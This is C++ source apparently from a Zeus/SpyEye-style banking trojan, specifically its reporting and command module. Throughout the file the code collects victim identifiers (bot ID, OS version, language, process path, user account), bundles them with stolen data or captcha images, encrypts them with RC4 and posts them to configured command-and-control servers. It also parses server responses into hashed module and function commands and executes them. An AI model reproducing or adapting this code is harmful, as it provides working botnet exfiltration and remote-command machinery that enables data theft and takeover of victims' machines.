#include <windows.h>
#include <security.h>
#include <accctrl.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "DllCore.h"
#include "dllconfig.h"
#include "spyeye_modules.h"

#include "report.h"
#include "osenv.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\winsecurity.h"
#include "..\common\httptools.h"
#include "..\common\wininet.h"
#include "..\common\wsocket.h"
#include "..\common\process.h"
#include "..\common\fs.h"
#include "..\common\time.h"
#include "..\common\sync.h"

static DWORD threadResult;

//Общая струкура для работы с сервером.
typedef struct
{
	LPSTR serverUrl;							//Server URL, used with insta-sender.
	BinStorage::STORAGE *binOutgoingStorage;	//Storage to send
}SENDERDATA;

//Внутриннии данные для XSender.
enum 
{
	DSR_SENDED,    //Отчет отправлен.
	DSR_WAIT_DATA, //Ожидание данных.
	DSR_ERROR      //Ошибка при отравки.
};

void Report::init(void)
{

}

void Report::uninit(void)
{

}

bool Report::addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags)
{
	bool r = true;
	bool created = false;

	if(*binStorage == NULL)
	{
		if((*binStorage = BinStorage::_createEmpty()) == NULL)
			return false;
		created = true;
	}

	if(flags & BIF_BOT_ID)
	{
		if(r)
		{
			r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_BOT_ID, BinStorage::ITEMF_COMBINE_OVERWRITE, coreDllData.compId);
		}

	}

	if(r && flags & BIF_BOT_VERSION)
	{
		DWORD version = BOT_VERSION;
		r = BinStorage::_addItem(binStorage, SBCID_BOT_VERSION, BinStorage::ITEMF_COMBINE_OVERWRITE, &version, sizeof(DWORD));
	}

	if(flags & BIF_TIME_INFO)
	{
		DWORD time;
		if(r)
		{
			time = Time::_getTime();
			r = BinStorage::_addItem(binStorage, SBCID_TIME_SYSTEM, BinStorage::ITEMF_COMBINE_OVERWRITE, &time, sizeof(DWORD));
		}

		if(r)
		{
			time = (DWORD)Time::_getLocalGmt();
			r = BinStorage::_addItem(binStorage, SBCID_TIME_LOCALBIAS, BinStorage::ITEMF_COMBINE_OVERWRITE, &time, sizeof(DWORD));
		}

		if(r)
		{
			time = CWA(kernel32, GetTickCount)();
			r = BinStorage::_addItem(binStorage, SBCID_TIME_TICK, BinStorage::ITEMF_COMBINE_OVERWRITE, &time, sizeof(DWORD));
		}
	}

	if(r && flags & BIF_OS)
	{
		OsEnv::OSINFO oi;
		OsEnv::_getVersionEx(&oi);

		r = BinStorage::_addItem(binStorage, SBCID_OS_INFO, BinStorage::ITEMF_COMBINE_OVERWRITE, &oi, sizeof(OsEnv::OSINFO));

		if(r)
		{
			LANGID lang = CWA(kernel32, GetUserDefaultUILanguage)();
			r = BinStorage::_addItem(binStorage, SBCID_LANGUAGE_ID, BinStorage::ITEMF_COMBINE_OVERWRITE, &lang, sizeof(LANGID));
		}
	}

	if(r && flags & BIF_PROCESS_FILE)
	{
		WCHAR file[MAX_PATH];
		DWORD size;

		if((size = CWA(kernel32, GetModuleFileNameW)(NULL, file, MAX_PATH - 1)) > 0)
		{
			file[size] = 0; //На всякий случай.
			r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_NAME, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
		}

		size = sizeof(file) / sizeof(WCHAR);
		if(r && CWA(secur32, GetUserNameExW)(NameSamCompatible, file, &size) != FALSE && size > 0)
		{
			file[size] = 0; //На всякий случай.
			r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_USER, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
		}
	}

	if(r == false && created == true)
	{
		Mem::free(*binStorage);
		*binStorage = NULL;
	}

	return r;
}

static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
{
	SENDERDATA *senderData = (SENDERDATA *)session->customData;

	return Report::SSPR_CONTUNUE;
}

static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
{
	SENDERDATA *senderData = (SENDERDATA *)session->customData;
	do
	{
		if(session->postData->flags & BinStorage::ITEMF_IS_COMMAND)
		{
			WDEBUG0(WDDT_INFO, "Command accepted.");
			BinStorage::ITEM* curItem = NULL;
			DWORD id = 0;
			SpyEye_Modules::COMMAND_LIST* cmds = (SpyEye_Modules::COMMAND_LIST*)Mem::alloc(sizeof(SpyEye_Modules::COMMAND_LIST));
			SpyEye_Modules::COMMAND_LIST* currentCmd = cmds;
			if(!cmds) {break;}
			bool ok = false;

			while(curItem = BinStorage::_getNextItem(session->postData, curItem))
			{
				if(!id) id=curItem->id; //first iteration.
				else if(id != curItem->id) //Мы можем так поступить потому что сервер будет отсылать данные каждой комманды по очереди.
				{
					currentCmd->next = (SpyEye_Modules::COMMAND_LIST*)Mem::alloc(sizeof(SpyEye_Modules::COMMAND_LIST));
					if(!currentCmd->next) {WDEBUG0(WDDT_ERROR, "M#3");break;}
					currentCmd = currentCmd->next;
				}

				if(curItem->flags & BinStorage::ITEMF_IS_MODULE_HASH)
				{
					DWORD* temp = (LPDWORD)BinStorage::_getItemData(curItem);
					currentCmd->ModuleCrc32 = *temp;
					Mem::free(temp);
				}
				else if(curItem->flags & BinStorage::ITEMF_IS_PROC_NAME_HASH)
				{
					DWORD* temp = (LPDWORD)BinStorage::_getItemData(curItem);
					currentCmd->FunctionCrc32 = *temp;
					Mem::free(temp);
				}
				else if(curItem->flags & BinStorage::ITEMF_IS_ARGUMENT)
				{
					PVOID temp = BinStorage::_getItemData(curItem);
					currentCmd->Parameters = (LPVOID*)Mem::realloc(currentCmd->Parameters, (currentCmd->Count + 1) * sizeof(LPVOID));
					currentCmd->Parameters[currentCmd->Count++] = temp;
				}
			
			}

			if(currentCmd->FunctionCrc32 && currentCmd->ModuleCrc32)
			{
				WDEBUG3(WDDT_INFO, "First Function crc32: 0x%X, Params count: 0x%X, Module crc32: 0x%X", cmds->FunctionCrc32, cmds->Count, cmds->ModuleCrc32);
				DWORD res = SpyEye_Modules::ExecuteCommands(cmds);
				WDEBUG1(WDDT_WARNING, "Result: %u", res);
			}
		}
	} while(false);
	ending:
	return Report::SSPR_END;
}

static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, Report::SERVERSESSION *session, BinStorage::STORAGE *originalPostData, DWORD loop)
{
	int result = Report::SSPR_ERROR;
	session->postData = originalPostData == NULL ? BinStorage::_createEmpty() : (BinStorage::STORAGE *)Mem::copyEx(originalPostData, originalPostData->size);

	if(session->postData != NULL)
	{
		DWORD size;
		int procRetCode = session->requestProc(loop, session);
		if(procRetCode != Report::SSPR_CONTUNUE)
			result = procRetCode;
		else if(session->postData != NULL && (size = BinStorage::_pack(&session->postData, BinStorage::PACKF_FINAL_MODE, (Crypt::RC4KEY *)session->rc4Key)) > 0)
		{
			//Отправляем запрос.
			DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;
			if(ud->scheme == HttpTools::UDS_HTTPS)
				requestFlags |= Wininet::WISRF_IS_HTTPS;

			HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud->uri, NULL, session->postData, size, requestFlags);
			if(requestHandle != NULL)
			{
				//Получаем ответ.
				MEMDATA md;
				if(Wininet::_DownloadData(requestHandle, &md, 0, session->stopEvent))
				{
					//Распаковывем ответ.
					size = BinStorage::_unpack(NULL, md.data, md.size, (Crypt::RC4KEY *)session->rc4Key);
					
					Mem::free(session->postData);
					session->postData = (BinStorage::STORAGE *)md.data;

					if(size > 0)
						result = session->resultProc(loop, session);
				}
				CWA(wininet, InternetCloseHandle)(requestHandle);
			}
		}

		Mem::free(session->postData);
	}
	return result;
}

bool Report::startServerSession(SERVERSESSION *session)
{
	WDEBUG1(WDDT_INFO, "url=%S", session->url);

	bool retVal = false;
	HttpTools::URLDATA ud;
	BinStorage::STORAGE *originalPostData = session->postData; //Сохраняем оригинальные пост-данные.

	if(HttpTools::_parseUrl(session->url, &ud))
	{
		DllCore::initHttpUserAgent();

		//Цикл повтора подключений к серверу в случаи обрыва или недоступности.
		for(BYTE bi = 0; bi < WININET_CONNECT_RETRY_COUNT && retVal == false; bi++)
		{
			//Задержка.
			if(bi > 0)
			{
				if(session->stopEvent != NULL)
				{
					if(CWA(kernel32, WaitForSingleObject)(session->stopEvent, WININET_CONNECT_RETRY_DELAY) != WAIT_TIMEOUT)
						break;
				}
				else 
					CWA(kernel32, Sleep)(WININET_CONNECT_RETRY_DELAY);
			}

			//Создаем хэндл сервера.
			HINTERNET serverHandle = Wininet::_Connect(coreDllData.httpUserAgent, ud.host, ud.port, bi % 2 == 0 ? Wininet::WICF_USE_IE_PROXY : 0);
			if(serverHandle != NULL)
			{
				for(DWORD loop = 0;; loop++)
				{
					int r = sendRequest(&ud, serverHandle, session, originalPostData, loop);
					if(r == SSPR_ERROR)
						break;
					else if(r == SSPR_END)
					{
						retVal = true; 
						break;
					}
				}
				Wininet::_CloseConnection(serverHandle);
			}
		}
		HttpTools::_freeUrlData(&ud);
	}

	session->postData = originalPostData; //Восстанавливаем оригинальные пост-данные.
	return retVal;
}


static DWORD WINAPI instaSender(void *p)
{
	SENDERDATA *senderData = (SENDERDATA *)p;
	Report::SERVERSESSION serverSession;
	Crypt::RC4KEY rc4Key;

	Mem::_zero(&serverSession, sizeof(Report::SERVERSESSION));

	serverSession.requestProc = defaultSenderRequestProc;
	serverSession.resultProc  = defaultSenderResultProc;
	serverSession.stopEvent   = coreDllData.stopEvent;
	//serverSession.stopEvent   = NULL;
	serverSession.rc4Key      = &rc4Key;
	serverSession.customData  = senderData;

	DllConfig::getRc4Key(&rc4Key);

	WDEBUG0(WDDT_INFO, "About to send insta-data");
	if(DllCore::isActive())
	{
		serverSession.url = senderData->serverUrl;
		
		if(serverSession.url != NULL)
		{
			serverSession.postData = senderData->binOutgoingStorage;
			Report::startServerSession(&serverSession);
		}
	}
	WDEBUG0(WDDT_INFO, "Insta-data sent");
	Mem::free(senderData->serverUrl);
	Mem::free(senderData->binOutgoingStorage);
	Mem::free(senderData);
	return 0;
}

bool Report::writeData(DWORD type, LPWSTR sourcePath, void *data, DWORD dataSize)
{
	bool retVal = false;
	BinStorage::STORAGE *binStorage = NULL;
	SENDERDATA *sdata;

	if(dataSize < BINSTORAGE_MAX_SIZE && addBasicInfo(&binStorage, BIF_BOT_VERSION | BIF_TIME_INFO | BIF_OS | BIF_PROCESS_FILE | BIF_BOT_ID))
	{
		if(BinStorage::_addItem(&binStorage, SBCID_BOTLOG_TYPE, BinStorage::ITEMF_COMBINE_OVERWRITE, &type, sizeof(DWORD)) &&
			BinStorage::_addItem(&binStorage, SBCID_BOTLOG,      BinStorage::ITEMF_COMBINE_OVERWRITE, data, dataSize))
		{
			if(sourcePath == NULL || BinStorage::_addItemAsUtf8StringW(&binStorage, SBCID_PATH_SOURCE, BinStorage::ITEMF_COMBINE_OVERWRITE, sourcePath))
			{		
				if (sdata = (SENDERDATA *)Mem::alloc(sizeof(SENDERDATA)))
				{
					BinStorage::STORAGE *dynCfg = coreDllData.currentConfig;
					if(dynCfg != NULL)
					{
						sdata->serverUrl = (LPSTR)BinStorage::_getItemDataEx(dynCfg, CFGID_URL_SERVER_0, BinStorage::ITEMF_IS_OPTION, NULL);

						sdata->binOutgoingStorage = binStorage;

						Process::_createThread(NULL, instaSender, sdata);

						retVal = true;
						
						WDEBUG3(WDDT_INFO, "Writed new report: retVal=%u, type=%u, dataSize=%u", retVal, type, dataSize);
					}
				}
			}
			
		}
	}
	return retVal;
}

bool Report::writeString(DWORD type, LPWSTR sourcePath, LPWSTR string, DWORD stringSize)
{
	bool r = false;
	Str::UTF8STRING u8s;
	if(Str::_utf8FromUnicode(string, stringSize, &u8s))
	{
		r =  writeData(type, sourcePath, u8s.data, u8s.size);
		Str::_utf8Free(&u8s);
	}
	return r;
}

bool Report::writeIStream(DWORD type, LPWSTR sourcePath, IStream *data)
{
	STATSTG ss;
	bool ok = false;
	if(data->Stat(&ss, STATFLAG_NONAME) == S_OK && ss.cbSize.LowPart < BINSTORAGE_MAX_SIZE && ss.cbSize.HighPart == 0)
	{
		DWORD size = ss.cbSize.LowPart;
		void *buf = Mem::alloc(size);
		if(buf != NULL)
		{
			if(data->Read(buf, size, &size) == S_OK)
				ok = writeData(type, sourcePath, buf, size);
			Mem::free(buf);
		}
	}
	return ok;
}

bool Report::writeCaptcha(LPWSTR path, void *data, DWORD dataSize)
{
	bool retVal = false;
	DWORD type = BLT_FILE;
	BinStorage::STORAGE *binStorage = NULL;
	SENDERDATA *sdata;

	if(dataSize < BINSTORAGE_MAX_SIZE && addBasicInfo(&binStorage, BIF_BOT_VERSION | BIF_TIME_INFO | BIF_OS | BIF_PROCESS_FILE | BIF_BOT_ID))
	{
		if(BinStorage::_addItem(&binStorage, SBCID_BOTLOG_TYPE, BinStorage::ITEMF_COMBINE_OVERWRITE, &type, sizeof(DWORD)) &&
			BinStorage::_addItem(&binStorage, SBCID_BOTLOG,     BinStorage::ITEMF_COMBINE_OVERWRITE, data, dataSize))
		{
			if(path == NULL || BinStorage::_addItemAsUtf8StringW(&binStorage, SBCID_PATH_DEST, BinStorage::ITEMF_COMBINE_OVERWRITE, path))
			{
				if (sdata = (SENDERDATA *)Mem::alloc(sizeof(SENDERDATA)))
				{
					BinStorage::STORAGE *dynCfg = coreDllData.currentConfig;
					if(dynCfg != NULL)
					{
						sdata->serverUrl = (LPSTR)BinStorage::_getItemDataEx(dynCfg, CFGID_CAPTCHA_SERVER, BinStorage::ITEMF_IS_OPTION, NULL);

						sdata->binOutgoingStorage = binStorage;

						Process::_createThread(NULL, instaSender, sdata);

						retVal = true;
					}
				}
			}
		}
	}
	return retVal;
}

void Report::sendNotification(LPSTR url)
{
	bool ok = false;
	BinStorage::STORAGE *binStorage = NULL;
	SENDERDATA *sdata;

	if(addBasicInfo(&binStorage, BIF_TIME_INFO | BIF_BOT_ID))
	{
		if(BinStorage::_addItemAsUtf8StringA(&binStorage, SBCID_BOTLOG, BinStorage::ITEMF_COMBINE_OVERWRITE, url))
		{
			if (sdata = (SENDERDATA *)Mem::alloc(sizeof(SENDERDATA)))
			{
				BinStorage::STORAGE *dynCfg = coreDllData.currentConfig;
				if(dynCfg != NULL)
				{
					sdata->serverUrl = (LPSTR)BinStorage::_getItemDataEx(dynCfg, CFGID_NOTIFY_SERVER, BinStorage::ITEMF_IS_OPTION, NULL);

					sdata->binOutgoingStorage = binStorage;

					Process::_createThread(NULL, instaSender, sdata);
				}
			}
		}
	}
}